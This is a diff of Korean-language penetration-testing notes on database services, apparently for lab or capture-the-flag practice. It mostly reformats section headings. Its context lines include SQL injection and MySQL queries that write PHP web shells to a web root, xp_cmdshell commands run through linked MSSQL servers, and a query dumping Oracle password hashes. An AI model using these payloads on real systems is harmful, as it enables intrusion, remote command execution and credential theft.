@@ -1,5 +1,5 @@
-# Database Services
-## 🔐 SQL Injection
+<details>
+  <summary><strong>SQL Injection</strong></summary>
 
 SQL Injection은 애플리케이션의 입력값 검증 취약점을 이용하여 데이터베이스에 임의의 SQL 쿼리를 실행하는 공격 기법입니다.
 
@@ -122,9 +122,13 @@ secure_file_priv 설정이 허용하는 경우 파일을 서버에 작성할 수
 # 주의: 500 에러가 발생해도 파일이 생성되었을 수 있으므로 확인 필요
 ' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
 ```
----
 
-## 📊 MySQL
+</details>
+
+---
+<details>
+  <summary><strong>MySQL</strong></summary>
+
 **기본 포트**: 3306
 
 ### 기본 시스템 데이터베이스
@@ -170,9 +174,11 @@ SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshe
 1. 웹쉘 업로드 후 `http://target-ip/webshell.php?c=whoami` 형태로 접근
 2. `c` 파라미터를 통해 시스템 명령 실행
 
----
+</details>
 
-## 🗄️ MSSQL (Microsoft SQL Server)
+---
+<details>
+  <summary><strong>MSSQL (Microsoft SQL Server)</strong></summary>
 
 Microsoft의 상용 관계형 데이터베이스 관리 시스템입니다.  
 **기본 포트**: 1433
@@ -377,8 +383,13 @@ EXEC ('xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV]
 -- 원격 서버의 파일 읽기
 EXEC ('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
 ```
+
+</details>
+
 ---
-## POSTGRESQL(5432)
+<details>
+  <summary><strong>POSTGRESQL(5432)</strong></summary>
+
 ### 기본 연결
 
 ```bash
@@ -402,9 +413,12 @@ psql -h localhost -p 5432 -U christine
 # 테이블 데이터 조회
 select * from flag;
 ```
----
+  
+</details>
 
-## 🏛️ Oracle TNS (Transparent Network Substrate)
+---
+<details>
+  <summary><strong>Oracle TNS (Transparent Network Substrate)</strong></summary>
 
 Oracle Database의 네트워크 통신 프로토콜입니다.  
 **기본 포트**: 1521
@@ -469,3 +483,5 @@ SELECT * FROM user_role_privs;
 -- sys.user$: 시스템 사용자 정보 (DBA 권한 필요)
 SELECT name, password FROM sys.user$;
 ```
+
+</details>
